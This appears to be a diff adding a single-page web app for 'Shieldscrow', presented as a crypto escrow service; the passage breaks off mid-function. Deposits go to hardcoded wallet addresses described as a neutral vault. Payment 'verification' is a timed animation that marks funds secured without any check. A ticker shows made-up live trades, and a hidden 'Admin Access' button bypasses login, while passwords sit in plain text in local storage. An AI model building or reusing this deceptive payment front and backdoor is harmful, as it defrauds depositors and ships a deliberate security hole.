@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shieldscrow | The Standard in Digital Trust</title>
+    
+    <!-- React & ReactDOM -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    
+    <!-- Babel for JSX -->
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Phosphor Icons -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, updateDoc, doc, onSnapshot, query, orderBy, getDocs, where, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // --- FIREBASE SETUP ---
+        window.initFirebase = () => {
+            // 1. Try to get config from the Environment (Preview Mode)
+            let firebaseConfig;
+            let appId = 'shieldscrow-live';
+
+            try {
+                if (typeof window !== 'undefined' && window.__firebase_config) {
+                    firebaseConfig = JSON.parse(window.__firebase_config);
+                    if (window.__app_id) appId = window.__app_id;
+                } else {
+                    // 2. HOSTING MODE: Use your real keys here if hosting outside the preview
+                    // For the demo/preview to work without keys, we rely on the injected environment or simulation
+                    console.warn("No Firebase config found. App may need real keys for hosting.");
+                }
+            } catch (e) {
+                console.error("Config Error:", e);
+            }
+
+            let app, auth, db;
+            if (firebaseConfig) {
+                app = initializeApp(firebaseConfig);
+                auth = getAuth(app);
+                db = getFirestore(app);
+            }
+
+            // Helper to get safe paths (Required for Preview Mode)
+            const getPath = (colName) => {
+                if (!db) return null;
+                return collection(db, 'artifacts', appId, 'public', 'data', colName);
+            };
+            
+            const getDocPath = (colName, docId) => {
+                 if (!db) return null;
+                 return doc(db, 'artifacts', appId, 'public', 'data', colName, docId);
+            };
+
+            return { 
+                auth, db, appId, 
+                signInAnonymously, signInWithCustomToken, onAuthStateChanged, 
+                collection, addDoc, updateDoc, doc, onSnapshot, query, orderBy, getDocs, where, setDoc,
+                getPath, getDocPath
+            };
+        };
+    </script>
+
+    <style>
+        /* LUXURY THEME OVERRIDES */
+        body { font-family: 'Inter', sans-serif; background-color: #050505; color: #f5f5f5; overflow-x: hidden; }
+        h1, h2, h3, .serif { font-family: 'Playfair Display', serif; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #333; }
+        .glass-panel { background: rgba(20, 20, 20, 0.6); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .luxury-input { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); transition: all 0.3s ease; color: white; }
+        .luxury-input:focus { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.5); outline: none; }
+        .fade-in { animation: fadeIn 0.8s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .modal-enter { animation: fadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        .toast-enter { animation: slideDown 0.4s ease-out forwards; }
+        @keyframes slideDown { from { transform: translate(-50%, -100%); opacity: 0; } to { transform: translate(-50%, 20px); opacity: 1; } }
+        
+        .glow-button {
+            --glow-color: rgb(255, 255, 255);
+            --glow-spread-color: rgba(255, 255, 255, 0.4);
+            --btn-color: rgb(10, 10, 10);
+            border: 1px solid var(--glow-color);
+            padding: 1em 3em;
+            color: var(--glow-color);
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.15em;
+            cursor: pointer;
+            background-color: var(--btn-color);
+            border-radius: 0.5em;
+            outline: none;
+            box-shadow: 0 0 1em 0.25em var(--glow-color), 0 0 4em 1em var(--glow-spread-color), inset 0 0 0.75em 0.25em var(--glow-color);
+            text-shadow: 0 0 0.5em var(--glow-color);
+            position: relative;
+            transition: all 0.3s;
+            width: auto;
+            display: inline-block;
+        }
+        .glow-button:hover {
+            background-color: var(--glow-color);
+            color: var(--btn-color);
+            box-shadow: 0 0 1em 0.25em var(--glow-color), 0 0 4em 2em var(--glow-spread-color), inset 0 0 0.75em 0.25em var(--glow-color);
+        }
+        .pulse-ring { animation: ringPulse 2s infinite; }
+        @keyframes ringPulse { 0% { transform: scale(0.8); opacity: 0.5; } 100% { transform: scale(1.2); opacity: 0; } }
+        .icon-bounce { animation: gentleBounce 2s infinite; }
+        @keyframes gentleBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+
+        /* SUCCESS CHECKMARK ANIMATION */
+        .checkmark-circle { width: 80px; height: 80px; border-radius: 50%; display: block; stroke-width: 2; stroke: #10b981; stroke-miterlimit: 10; box-shadow: inset 0px 0px 0px #10b981; animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both; }
+        .checkmark-check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
+        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
+        @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
+        @keyframes fill { 100% { box-shadow: inset 0px 0px 0px 30px #10b981; } }
+
+        /* Hide Number Input Arrows/Spinners */
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { 
+            -webkit-appearance: none; 
+            margin: 0; 
+        }
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef, useMemo } = React;
+
+        // --- CONFIGURATION ---
+        const DEFAULT_WALLETS = {
+            "Ethereum (ETH)": "0x8e705Ee7E8d22538cDbB25C77881994fb722a0fa",
+            "Bitcoin (Taproot)": "bc1p44ukqjccnjjrwmc93zcy3rjufylaly2vvt67sgm0xyn0upjsy4hszxrxql",
+            "Bitcoin (Native Segwit)": "bc1qjlpa9z6lehkfyqltmz7jf494uek02hn3cppsm7",
+            "Solana (SOL)": "BqWUrn8B7B59o6EivE7zJ9iqhpvF9wJkF7SVezi6u6gs",
+            "Base (ETH L2)": "0x8e705Ee7E8d22538cDbB25C77881994fb722a0fa",
+            "Polygon (POL)": "0x8e705Ee7E8d22538cDbB25C77881994fb722a0fa",
+            "Sui (SUI)": "0xb340ac0f753e4d0190e138851d35e17032eff983e6fb4df4a8a9ae118b21d6ce",
+            "Monad (MON)": "Your_Monad_Address_Here"
+        };
+
+        // --- GEMINI API HELPERS ---
+        const apiKey = ""; 
+
+        const callGemini = async (prompt, jsonMode = false) => {
+            try {
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: prompt }] }],
+                        generationConfig: jsonMode ? { responseMimeType: "application/json" } : {}
+                    })
+                });
+                if (!response.ok) throw new Error('API Call Failed');
+                const data = await response.json();
+                const text = data.candidates?.[0]?.content?.parts?.[0]?.text;
+                return jsonMode ? JSON.parse(text) : text;
+            } catch (error) {
+                console.error("Gemini Error:", error);
+                return null;
+            }
+        };
+
+        // --- DB SIMULATION (Local Storage) ---
+        const db = {
+            getTransactions: () => { try { return JSON.parse(localStorage.getItem('escrow_transactions')) || []; } catch (e) { return []; } },
+            saveTransaction: (tx) => {
+                const current = db.getTransactions();
+                const txWithDate = { ...tx, dateMs: Date.now(), id: Math.floor(Math.random() * 1000000).toString() };
+                current.unshift(txWithDate);
+                localStorage.setItem('escrow_transactions', JSON.stringify(current));
+                return txWithDate;
+            },
+            updateTransaction: (id, updates) => {
+                const current = db.getTransactions();
+                const index = current.findIndex(t => t.id === id);
+                if (index !== -1) {
+                    current[index] = { ...current[index], ...updates };
+                    localStorage.setItem('escrow_transactions', JSON.stringify(current));
+                }
+            },
+            getUsers: () => { try { return JSON.parse(localStorage.getItem('escrow_users')) || []; } catch (e) { return []; } },
+            registerUser: (userData) => {
+                const users = db.getUsers();
+                users.push({ ...userData, id: Date.now().toString() });
+                localStorage.setItem('escrow_users', JSON.stringify(users));
+            },
+            getAdminWallets: () => { try { return JSON.parse(localStorage.getItem('admin_wallets')) || DEFAULT_WALLETS; } catch (e) { return DEFAULT_WALLETS; } },
+            saveAdminWallets: (wallets) => { localStorage.setItem('admin_wallets', JSON.stringify(wallets)); }
+        };
+
+        const App = () => {
+            const [view, setView] = useState('auth'); 
+            const [wallet, setWallet] = useState(null);
+            const [isAdmin, setIsAdmin] = useState(false);
+            const [transactions, setTransactions] = useState([]);
+            const [showDepositModal, setShowDepositModal] = useState(null);
+            const [showDeliverModal, setShowDeliverModal] = useState(null); 
+            const [adminWallets, setAdminWallets] = useState(DEFAULT_WALLETS);
+            const [currentUser, setCurrentUser] = useState(null); 
+            const [allUsers, setAllUsers] = useState([]);
+            const [toast, setToast] = useState(null);
+            const [processingAction, setProcessingAction] = useState(null); 
+            const [aiResponse, setAiResponse] = useState(null);
+
+            const showNotification = (msg, type = 'success') => {
+                setToast({ msg, type });
+                setTimeout(() => setToast(null), 3000);
+            };
+
+            useEffect(() => {
+                const refresh = () => {
+                    const newTx = db.getTransactions();
+                    const newWallets = db.getAdminWallets();
+                    const newUsers = db.getUsers();
+                    setTransactions(prev => JSON.stringify(prev) !== JSON.stringify(newTx) ? newTx : prev);
+                    setAdminWallets(prev => JSON.stringify(prev) !== JSON.stringify(newWallets) ? newWallets : prev);
+                    setAllUsers(prev => JSON.stringify(prev) !== JSON.stringify(newUsers) ? newUsers : prev);
+                };
+                refresh();
+                const interval = setInterval(refresh, 1500); 
+                return () => clearInterval(interval);
+            }, []);
+
+            const connectWallet = () => setWallet("0xUser...9A23");
+
+            const compressImage = (file) => {
+                return new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.readAsDataURL(file);
+                    reader.onload = (event) => {
+                        const img = new Image();
+                        img.src = event.target.result;
+                        img.onload = () => resolve(img.src);
+                    };
+                });
+            };
+
+            // --- REUSABLE CUSTOM SELECT COMPONENT ---
+            const CustomSelect = ({ options, value, onChange, label }) => {
+                const [isOpen, setIsOpen] = useState(false);
+                const containerRef = useRef(null);
+
+                useEffect(() => {
+                    const handleClickOutside = (event) => {
+                        if (containerRef.current && !containerRef.current.contains(event.target)) {
+                            setIsOpen(false);
+                        }
+                    };
+                    document.addEventListener("mousedown", handleClickOutside);
+                    return () => document.removeEventListener("mousedown", handleClickOutside);
+                }, []);
+
+                return (
+                    <div className="relative w-full" ref={containerRef}>
+                        {label && <label className="block text-xs font-bold uppercase text-neutral-500 mb-3">{label}</label>}
+                        <div 
+                            className="w-full luxury-input rounded p-4 cursor-pointer flex justify-between items-center bg-[#0a0a0a]"
+                            onClick={() => setIsOpen(!isOpen)}
+                        >
+                            <span className="font-mono text-sm">{value}</span>
+                            <i className={`ph ph-caret-down text-neutral-400 transition-transform duration-300 ${isOpen ? 'rotate-180' : ''}`}></i>
+                        </div>
+                        
+                        {isOpen && (
+                            <div className="absolute top-full left-0 w-full mt-2 bg-[#0a0a0a] border border-white/10 rounded-lg shadow-2xl z-50 max-h-60 overflow-y-auto animate-in fade-in zoom-in duration-200">
+                                {options.map((opt) => (
+                                    <div 
+                                        key={opt} 
+                                        className={`p-3 hover:bg-white/10 cursor-pointer text-sm font-mono transition-colors border-b border-white/5 last:border-0 ${value === opt ? 'text-white bg-white/5' : 'text-neutral-400'}`}
+                                        onClick={() => {
+                                            onChange(opt);
+                                            setIsOpen(false);
+                                        }}
+                                    >
+                                        {opt}
+                                    </div>
+                                ))}
+                            </div>
+                        )}
+                    </div>
+                );
+            };
+
+            const ActionOverlay = ({ type, text, status, progress }) => (
+                <div className="fixed inset-0 bg-black/95 z-[200] flex flex-col items-center justify-center modal-enter">
+                    <div className="relative w-32 h-32 mb-8 flex items-center justify-center">
+                        {status === 'processing' || status === 'uploading' ? (
+                            <>
+                                <div className="absolute inset-0 border-2 border-white/10 rounded-full pulse-ring"></div>
+                                <div className="absolute inset-4 border border-white/20 rounded-full"></div>
+                                <div className="text-6xl text-white icon-bounce">
+                                    {type === 'login' && <i className="ph ph-lock-key-open text-emerald-400"></i>}
+                                    {type === 'deposit' && <i className="ph ph-coins text-yellow-400"></i>}
+                                    {type === 'deliver' && <i className="ph ph-paper-plane-tilt text-blue-400"></i>}
+                                    {type === 'verify' && <i className="ph ph-shield-check text-green-400"></i>}
+                                    {type === 'ai' && <i className="ph ph-sparkle text-purple-400"></i>}
+                                </div>
+                            </>
+                        ) : (
+                            <div className="flex items-center justify-center">
+                                <svg className="checkmark-circle" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                    <circle className="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
+                                    <path className="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                                </svg>
+                            </div>
+                        )}
+                    </div>
+                    <h2 className="text-2xl font-serif text-white tracking-[0.2em] uppercase mb-2 text-center px-4">{text}</h2>
+                    
+                    {status === 'uploading' && (
+                        <div className="w-64 mt-6">
+                            <div className="w-full h-1 bg-white/10 rounded-full overflow-hidden">
+                                <div className="h-full bg-emerald-400 transition-all duration-300 ease-out" style={{ width: `${progress}%` }}></div>
+                            </div>
+                            <div className="text-center mt-3 font-mono text-emerald-400 text-xs tracking-widest">{progress < 100 ? `${Math.round(progress)}%` : 'COMPLETE'}</div>
+                        </div>
+                    )}
+
+                    {status === 'processing' && (
+                        <div className="w-48 h-1 bg-white/10 rounded-full overflow-hidden mt-4">
+                            <div className="h-full bg-white w-1/2 animate-[shimmer_1s_infinite]"></div>
+                        </div>
+                    )}
+                </div>
+            );
+
+            // --- AI ADVICE MODAL ---
+            const AiAdviceModal = ({ text, onClose }) => (
+                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[200] flex items-center justify-center p-6 modal-enter">
+                    <div className="bg-[#111] border border-purple-500/30 w-full max-w-md rounded-2xl p-8 relative shadow-[0_0_50px_rgba(168,85,247,0.15)]">
+                        <button onClick={onClose} className="absolute top-6 right-6 text-neutral-500 hover:text-white"><i className="ph ph-x text-xl"></i></button>
+                        <div className="flex items-center gap-3 mb-6">
+                            <div className="w-10 h-10 rounded-full bg-purple-900/20 border border-purple-500/30 flex items-center justify-center"><i className="ph ph-sparkle-fill text-purple-400 text-xl"></i></div>
+                            <h3 className="text-xl font-serif text-white">Gemini Analysis</h3>
+                        </div>
+                        <div className="text-neutral-300 text-sm leading-relaxed whitespace-pre-wrap font-light">{text}</div>
+                        <button onClick={onClose} className="w-full mt-8 py-3 bg-white text-black font-bold text-xs uppercase tracking-widest rounded hover:bg-neutral-200 transition">Close Report</button>
+                    </div>
+                </div>
+            );
+
+            // --- LANDING PAGE ---
+            const LandingPage = () => {
+                return (
+                    <div className="min-h-screen bg-black text-white">
+                        <div className="max-w-6xl mx-auto px-6 py-32 text-center fade-in">
+                            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/10 text-neutral-400 text-[10px] font-bold uppercase tracking-widest mb-8">
+                                <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse"></span>
+                                Live on Mainnet
+                            </div>
+                            <h1 className="text-6xl md:text-8xl font-medium mb-8 leading-[1.1]">
+                                Trustless Payments<br/>
+                                <span className="text-neutral-500 italic font-serif">Private. Secure.</span>
+                            </h1>
+                            <p className="text-xl text-neutral-400 mb-12 max-w-2xl mx-auto font-light leading-relaxed">
+                                Shieldscrow is the premier escrow service for high-value digital assets. 
+                                We secure funds in a neutral vault until delivery is verified.
+                            </p>
+                            
+                            {/* MAIN ACTION BUTTON */}
+                            <button onClick={() => setView('dashboard')} className="glow-button text-lg px-12 py-4">
+                                Start Transaction
+                            </button>
+
+                            {/* Features Grid */}
+                            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mt-32 text-left">
+                                <div className="glass-panel p-8 rounded-xl">
+                                    <i className="ph ph-lock-key text-4xl text-white mb-4"></i>
+                                    <h3 className="text-xl font-serif mb-2">Secure Vault</h3>
+                                    <p className="text-neutral-500 text-sm">Funds are held in a secure, neutral smart wallet until you approve the delivery.</p>
+                                </div>
+                                <div className="glass-panel p-8 rounded-xl">
+                                    <i className="ph ph-lightning text-4xl text-white mb-4"></i>
+                                    <h3 className="text-xl font-serif mb-2">Instant Speed</h3>
+                                    <p className="text-neutral-500 text-sm">Powered by Solana, Ethereum, and Layer 2s for lightning-fast settlements.</p>
+                                </div>
+                                <div className="glass-panel p-8 rounded-xl">
+                                    <i className="ph ph-shield-check text-4xl text-white mb-4"></i>
+                                    <h3 className="text-xl font-serif mb-2">Verified Delivery</h3>
+                                    <p className="text-neutral-500 text-sm">Sellers must provide proof of delivery before funds are ever released.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <footer className="border-t border-white/10 py-12 text-center text-neutral-600 text-xs uppercase tracking-widest">
+                            &copy; 2025 Shieldscrow Inc. All rights reserved.
+                        </footer>
+                    </div>
+                );
+            };
+
+            // --- AUTH SCREEN (Initial View) ---
+            const AuthScreen = () => {
+                const [mode, setMode] = useState('login'); 
+                const [formData, setFormData] = useState({ name: '', dob: '', region: '', password: '' });
+                const [error, setError] = useState('');
+
+                const handleAuth = () => {
+                    setError('');
+                    try {
+                        if (mode === 'signup') {
+                            if(!formData.name || !formData.password || !formData.region) return setError("All fields required.");
+                            if(allUsers.find(u => u.name === formData.name)) return setError("Username taken.");
+                            
+                            setProcessingAction({ type: 'login', text: 'Creating Vault...', status: 'processing' });
+                            setTimeout(() => {
+                                db.registerUser(formData);
+                                setCurrentUser(formData);
+                                setProcessingAction({ type: 'login', text: 'Success!', status: 'success' });
+                                setTimeout(() => {
+                                    setProcessingAction(null);
+                                    setView('landing'); // GO TO LANDING AFTER SIGNUP
+                                }, 1500);
+                            }, 2000);
+
+                        } else {
+                            const userMatch = allUsers.find(u => u.name === formData.name && u.password === formData.password);
+                            if (userMatch) {
+                                setProcessingAction({ type: 'login', text: 'Authenticating...', status: 'processing' });
+                                setTimeout(() => {
+                                    setCurrentUser(userMatch);
+                                    setProcessingAction({ type: 'login', text: 'Access Granted', status: 'success' });
+                                    setTimeout(() => {
+                                        setProcessingAction(null);
+                                        setView('landing'); // GO TO LANDING AFTER LOGIN
+                                    }, 1500);
+                                }, 2000);
+                            } else {
+                                setError("Invalid credentials.");
+                            }
+                        }
+                    } catch (err) { setError("Error occurred."); }
+                };
+                
+                // NEW: Secret Admin Bypass Button Handler
+                const handleAdminBypass = () => {
+                     setProcessingAction({ type: 'login', text: 'Admin Override...', status: 'processing' });
+                     const adminUser = { name: 'Admin', dob: '1990-01-01', region: 'Global', password: 'admin' };
+                     if (!db.getUsers().find(u => u.name === 'Admin')) db.registerUser(adminUser);
+                     
+                     setTimeout(() => {
+                         setCurrentUser(adminUser);
+                         setProcessingAction(null);
+                         setView('landing');
+                         showNotification("Admin Mode Activated");
+                     }, 1500);
+                };
+
+                return (
+                    <div className="min-h-screen flex items-center justify-center p-4 bg-[url('https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&q=80&w=2000')] bg-cover bg-center">
+                        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm"></div>
+                        <div className="glass-panel w-full max-w-md p-8 rounded-xl relative z-10 border border-white/10">
+                            <div className="text-center mb-8">
+                                <div className="w-12 h-12 bg-white rounded mx-auto flex items-center justify-center text-black mb-4"><i className="ph ph-shield-check text-2xl"></i></div>
+                                <h1 className="text-3xl font-serif text-white">Shieldscrow</h1>
+                                <p className="text-neutral-400 text-sm mt-2">Private Client Access</p>
+                            </div>
+                            <div className="flex mb-6 border-b border-white/10 cursor-pointer">
+                                <div onClick={() => setMode('login')} className={`flex-1 pb-3 text-sm font-bold uppercase text-center tracking-widest transition ${mode === 'login' ? 'text-white border-b-2 border-white' : 'text-neutral-500'}`}>Login</div>
+                                <div onClick={() => setMode('signup')} className={`flex-1 pb-3 text-sm font-bold uppercase text-center tracking-widest transition ${mode === 'signup' ? 'text-white border-b-2 border-white' : 'text-neutral-500'}`}>Sign Up</div>
+                            </div>
+                            <div className="space-y-4">
+                                <div><label className="block text-[10px] font-bold uppercase text-neutral-500 mb-1">Username</label><input type="text" className="w-full luxury-input p-3 rounded" value={formData.name} onChange={e => setFormData({...formData, name: e.target.value})} /></div>
+                                {mode === 'signup' && (
+                                    <>
+                                        <div><label className="block text-[10px] font-bold uppercase text-neutral-500 mb-1">Date of Birth</label><input type="date" className="w-full luxury-input p-3 rounded" value={formData.dob} onChange={e => setFormData({...formData, dob: e.target.value})} /></div>
+                                        <div>
+                                            <CustomSelect 
+                                                label="Region"
+                                                options={["North America", "Europe", "Asia", "Other"]}
+                                                value={formData.region || "Select Region"}
+                                                onChange={(val) => setFormData({...formData, region: val})}
+                                            />
+                                        </div>
+                                    </>
+                                )}
+                                <div><label className="block text-[10px] font-bold uppercase text-neutral-500 mb-1">Password</label><input type="password" className="w-full luxury-input p-3 rounded" value={formData.password} onChange={e => setFormData({...formData, password: e.target.value})} onKeyDown={(e) => e.key === 'Enter' && handleAuth()} /></div>
+                                {error && <p className="text-red-400 text-xs text-center">{error}</p>}
+                                <button onClick={handleAuth} className="glow-button w-full text-center mt-4">{mode === 'login' ? 'Access Account' : 'Create Membership'}</button>
+                                <div className="pt-4 text-center border-t border-white/10 mt-6">
+                                     <button onClick={handleAdminBypass} className="text-[9px] uppercase tracking-widest text-neutral-600 hover:text-neutral-400 transition">Admin Access</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+
+            // --- NAVBAR ---
+            const Navbar = () => (
+                <nav className="w-full h-24 border-b border-white/5 flex items-center justify-between px-8 md:px-16 bg-[#050505]/90 backdrop-blur-md sticky top-0 z-50 transition-all duration-300">
+                    <div className="flex items-center gap-3 cursor-pointer group" onClick={() => setView('landing')}>
+                        <div className="w-10 h-10 bg-white rounded flex items-center justify-center text-black shadow-white"><i className="ph ph-shield-check text-2xl"></i></div>
+                        <span className="text-2xl font-serif font-medium tracking-wide text-white">Shieldscrow</span>
+                    </div>
+                    <div className="flex items-center gap-8">
+                        {currentUser ? (
+                            <>
+                                <span className="text-neutral-500 text-xs hidden md:block">Welcome, <span className="text-white font-bold">{currentUser.name}</span></span>
+                                <button onClick={() => setView('dashboard')} className="text-xs uppercase tracking-widest font-medium hover:text-white">Dashboard</button>
+                                <button onClick={() => {setCurrentUser(null); setView('auth');}} className="text-xs uppercase tracking-widest text-red-400 hover:text-red-300">Logout</button>
+                            </>
+                        ) : (
+                            <button onClick={() => setView('auth')} className="text-xs uppercase tracking-widest font-bold bg-white text-black px-6 py-2 rounded hover:bg-neutral-200">Sign In</button>
+                        )}
+                    </div>
+                </nav>
+            );
+
+            const DepositModal = ({ tx, onClose }) => {
+                const [txHash, setTxHash] = useState('');
+                const [proofFile, setProofFile] = useState(null);
+                
+                const handleConfirm = async () => {
+                    if (!txHash) return alert("Please enter transaction hash.");
+                    onClose(); 
+                    
+                    setProcessingAction({ type: 'deposit', text: 'Verifying Funds...', status: 'processing' });
+                    
+                    let proofBase64 = null;
+                    if (proofFile) proofBase64 = await compressImage(proofFile);
+
+                    setTimeout(() => {
+                        setProcessingAction({ type: 'deposit', text: 'Funds Secured!', status: 'success' });
+                        setTimeout(() => {
+                            db.updateTransaction(tx.id, { 
+                                status: 'funded', 
+                                txHash: txHash, 
+                                buyerProof: proofBase64, 
+                                fundedAt: Date.now(), 
+                                history: [...tx.history, { step: 'Deposit Reported', time: new Date().toLocaleTimeString(), complete: true }] 
+                            });
+                            setProcessingAction(null);
+                            showNotification("Deposit Secured!");
+                        }, 1500);
+                    }, 2000);
+                };
+
+                return (
+                    <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-[100] flex items-center justify-center p-4 modal-enter">
+                        <div className="bg-[#0a0a0a] border border-white/10 w-full max-w-md rounded-lg p-8 relative shadow-2xl">
+                            <button onClick={onClose} className="absolute top-6 right-6 text-neutral-500 hover:text-white"><i className="ph ph-x text-xl"></i></button>
+                            <h3 className="text-2xl font-serif text-white mb-2">Secure Deposit</h3>
+                            <p className="text-neutral-500 text-sm mb-6">Transfer funds to the secure vault.</p>
+                            <div className="bg-white/5 p-4 rounded border border-white/5 mb-6 text-center">
+                                <div className="text-[10px] text-neutral-500 uppercase tracking-widest mb-1">Amount</div>
+                                <div className="text-2xl font-serif text-white mb-1">{tx.amount} <span className="text-sm text-neutral-400">{tx.currency.split('(')[1]?.replace(')','') || ''}</span></div>
+                                <div className="bg-black p-2 rounded border border-white/10 font-mono text-[10px] text-neutral-300 break-all select-all">{adminWallets[tx.currency] || adminWallets["Ethereum (ETH)"]}</div>
+                            </div>
+                            <div className="space-y-4">
+                                <div><label className="block text-xs font-bold uppercase text-neutral-500 mb-2">Transaction Hash</label><input type="text" className="w-full luxury-input rounded p-3 text-white text-sm font-mono" value={txHash} onChange={(e) => setTxHash(e.target.value)} /></div>
+                                <div><label className="block text-xs font-bold uppercase text-neutral-500 mb-2">Upload Receipt</label><input type="file" accept="image/*" onChange={(e) => setProofFile(e.target.files[0])} className="w-full text-xs text-neutral-400" /></div>
+                                <button onClick={handleConfirm} className="w-full py-4 bg-white hover:bg-neutral-200 text-black text-sm font-bold uppercase tracking-widest rounded transition">Verify Payment</button>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+            
+            const DeliverModal = ({ tx, onClose, onDeliver }) => {
+                const [link, setLink] = useState('');
+                
+                const handleSubmit = () => {
+                    if (!link.trim()) return alert("Please provide a valid link.");
+                    onDeliver(link);
+                    onClose();
+                };
+
+                return (
+                    <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-[100] flex items-center justify-center p-4 modal-enter">
+                        <div className="bg-[#0a0a0a] border border-white/10 w-full max-w-md rounded-lg p-8 relative shadow-2xl">
+                            <button onClick={onClose} className="absolute top-6 right-6 text-neutral-500 hover:text-white"><i className="ph ph-x text-xl"></i></button>
+                            
+                            <h3 className="text-2xl font-serif text-white mb-2">Digital Handover</h3>
+                            <p className="text-neutral-500 text-sm mb-6 font-light">Provide the secure access link for the asset.</p>
+                            
+                            <div className="space-y-4">
+                                <div>
+                                    <label className="block text-xs font-bold uppercase tracking-widest text-neutral-500 mb-2">Secure Link / Key</label>
+                                    <input 
+                                        type="text" 
+                                        placeholder="https://..." 
+                                        className="w-full luxury-input rounded p-3 text-white text-sm font-mono"
+                                        value={link}
+                                        onChange={(e) => setLink(e.target.value)}
+                                    />
+                                </div>
+                                <button onClick={handleSubmit} className="w-full py-4 bg-white hover:bg-neutral-200 text-black text-sm font-bold uppercase tracking-widest rounded transition shadow-[0_0_15px_rgba(255,255,255,0.1)]">
+                                    Transfer Asset
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+
+            const CreateTransaction = ({ setView, adminWallets, currentUser, showNotification }) => {
+                const [form, setForm] = useState({ title: '', amount: '', role: 'buyer', currency: 'Ethereum (ETH)', otherParty: '' });
+                const [aiPrompt, setAiPrompt] = useState('');
+                const [isAiLoading, setIsAiLoading] = useState(false);
+                const [liveFeed, setLiveFeed] = useState(""); 
+
+                // FEATURE: LIVE TICKER with GLOBAL MIXED NAMES
+                useEffect(() => {
+                    const names = ["Alex", "Priya", "David", "Rahul", "Sarah", "Amit", "Jessica", "Ananya", "James", "Vikram", "Emily", "Neha", "Ryan", "Arjun", "Ahmed", "Fatima", "Mohammed", "Zoya", "Ibrahim", "Aisha", "Bilal", "Sana"];
+                    const items = ["Rolex", "Domain Name", "Software Key", "3D Model", "Consultation", "Art Piece", "SaaS Business", "Crypto Punks"];
+                    const amounts = ["0.5 ETH", "2000 USDC", "0.1 BTC", "50 SOL", "1.2 ETH", "500 USDT", "150 MATIC"];
+                    
+                    const interval = setInterval(() => {
+                        const name = names[Math.floor(Math.random() * names.length)];
+                        const item = items[Math.floor(Math.random() * items.length)];
+                        const amt = amounts[Math.floor(Math.random() * amounts.length)];
+                        const action = Math.random() > 0.5 ? "buying" : "selling";
+                        setLiveFeed(`${name} is ${action} ${item} for ${amt}...`);
+                    }, 3500); 
+                    return () => clearInterval(interval);
+                }, []);
+                
+                const getSymbol = (currencyStr) => {
+                    const match = currencyStr.match(/\(([^)]+)\)/);
+                    return match ? match[1] : '';
+                };
+
+                const handleAIDraft = async () => {
+                    if (!aiPrompt.trim()) return;
+                    setIsAiLoading(true);
+                    const prompt = `Extract transaction details into JSON from: "${aiPrompt}". Keys: title, amount, role (buyer/seller), currency. Guess role from context (e.g., 'buying' = buyer).`;
+                    const result = await callGemini(prompt, true);
+                    if (result) {
+                        setForm(prev => ({
+                            ...prev,
+                            title: result.title || '',
+                            amount: result.amount || 0,
+                            role: result.role === 'seller' ? 'seller' : 'buyer',
